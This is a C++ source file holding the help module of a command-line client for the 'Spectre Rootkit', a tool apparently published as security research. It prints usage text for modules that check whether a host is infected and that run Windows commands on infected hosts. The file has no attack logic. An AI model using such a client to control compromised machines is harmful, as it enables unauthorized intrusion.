/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * COPYRIGHT Bill Demirkapi 2020
 */
#include "HelpModule.h"

/**
    Provide usage information for the CLI.
    @return For the HelpModule, always TRUE.
*/
INT
HelpModule::ProcessArguments (
    VOID
    )
{
    std::cout << "The Spectre CLI is used for communicating with a host infected with the Spectre Rootkit." << std::endl;
    std::cout << "Usage:" << std::endl;
    std::cout << "\tspectre-cli.exe [module name] [module options]" << std::endl;
    std::cout << "Modules:" << std::endl;
    
    //
    // We created these functions so other modules can
    // print the usage for them.
    //
    this->PrintHelpUsage();
    this->PrintConfigureUsage();
    this->PrintPingUsage();
    this->PrintCommandUsage();
    return TRUE;
}

/**
    Print the usage of the Help module.
*/
VOID
HelpModule::PrintHelpUsage (
    VOID
    )
{
    std::cout << "\thelp" << std::endl << "\t\tDisplays this help menu." << std::endl;
}

/**
    Print the usage of the ConfigurationWizard module.
*/
VOID
HelpModule::PrintConfigureUsage (
    VOID
    )
{
    std::cout << "\tconfigure [output config file]" << std::endl << "\t\tLaunches the configuration wizard to generate a config file, used in other modules." << std::endl;
}

/**
    Print the usage of the Ping module.
*/
VOID
HelpModule::PrintPingUsage (
    VOID
    )
{
    std::cout << "\tping [config file name]" << std::endl << "\t\tUses a config file to determine if a host is infected with the Spectre Rootkit." << std::endl;
}

/**
    Print the usage of the Command module.
*/
VOID
HelpModule::PrintCommandUsage (
    VOID
    )
{
    std::cout << "\tcommand [config file name]" << std::endl << "\t\tUses a config file to execute a Windows command on an infected host." << std::endl;
}